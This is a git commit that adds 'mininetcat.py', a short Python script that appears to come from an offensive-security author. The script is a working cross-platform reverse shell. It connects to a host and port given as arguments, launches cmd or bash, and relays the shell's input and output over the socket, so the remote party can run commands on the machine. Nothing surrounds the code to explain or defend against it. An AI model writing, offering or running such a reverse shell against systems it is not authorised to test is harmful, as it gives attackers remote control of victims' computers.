9fba7f113ed68bf42410ce4bab40deed57a64a62
ArtesOscuras <xavi.breix@gmail.com>
2025-03-20 18:31:47 +0100

    Add files via upload

---
+++ mininetcat.py
@@ -0,0 +1,46 @@
+import os
+import socket
+import subprocess
+import threading
+import sys
+
+
+def system_detection():
+    if os.name == "nt":
+        return "windows"
+    else:
+        return "linux"
+
+shelltype="cmd"
+
+if system_detection() == "linux":
+    shelltype="bash"
+
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((sys.argv[1],int(sys.argv[2])))
+
+p=subprocess.Popen([shelltype], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
